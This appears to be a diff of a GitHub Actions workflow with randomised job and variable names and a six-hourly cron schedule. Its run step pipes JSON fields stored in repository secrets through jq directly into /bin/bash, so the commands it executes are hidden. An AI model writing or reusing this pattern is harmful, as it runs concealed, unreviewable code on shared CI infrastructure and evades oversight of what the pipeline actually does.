@@ -2,23 +2,31 @@ name: woryya
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 3/6 * * *'
-jobs:  # 4471
+    - cron: '28 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: woryya
         env:
-          vevpx01544: ${{ secrets.vevpx01544 }}
+          lrw326: ${{ secrets.lrw326 }}
         run: |
-          echo $vevpx01544 | jq -r .fzaxj40307 | /bin/bash
-          echo $ub87956 | jq -r .zated7 | /bin/bash
-          echo $vqbz603 | jq -r .keawk08548 | /bin/bash
-          echo $abul47 | jq -r .fhnix78 | /bin/bash
-          echo $dqmb4667 | jq -r .oo69 | /bin/bash
-          echo $jjert641 | jq -r .aap490 | /bin/bash
-          echo $wgh987 | jq -r .twm846 | /bin/bash
-          echo $ubih08335 | jq -r .zl4199 | /bin/bash
+          echo $lrw326 | jq -r .g91 | /bin/bash
+          echo $pex658 | jq -r .p35301 | /bin/bash
+          echo $mo0 | jq -r .f4 | /bin/bash
+          echo $wftt980 | jq -r .rwhn0134 | /bin/bash
+          echo $g61 | jq -r .p24270 | /bin/bash
+          echo $olee0 | jq -r .sdp579 | /bin/bash
+          echo $idvuo6 | jq -r .cbrvl0 | /bin/bash
+          echo $nbw0 | jq -r .pm585 | /bin/bash
+          echo $bni12629 | jq -r .ilu66 | /bin/bash
+          echo $luluy1 | jq -r .rew670 | /bin/bash
+          echo $sb69 | jq -r .wlowu81279 | /bin/bash
+          echo $lki990 | jq -r .qpen187 | /bin/bash
+          echo $jjz5534 | jq -r .ie5886 | /bin/bash
+          echo $gtrjs33 | jq -r .pkefy97016 | /bin/bash
+          echo $nqefn8 | jq -r .nwaah619 | /bin/bash
+          echo $rorqb11327 | jq -r .xpt396 | /bin/bash
+          echo $kisf2120 | jq -r .cccz31 | /bin/bash
 
